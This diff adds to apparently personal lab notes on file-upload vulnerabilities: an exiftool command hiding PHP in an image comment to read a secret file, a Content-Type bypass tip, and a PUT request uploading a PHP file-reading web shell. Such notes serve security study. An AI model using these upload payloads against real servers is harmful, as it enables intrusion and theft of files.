@@ -46,4 +46,13 @@ exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret'
 
 
 6) Bypass Content-Type checks by setting the value of the Content-Type header to: image/png , text/plain , application/octet-stream
-         
+
+
+
+Uploading using PUT
+PUT /images/exploit.php HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-httpd-php
+Content-Length: 49
+
+<?php echo file_get_contents('/path/to/file'); ?>
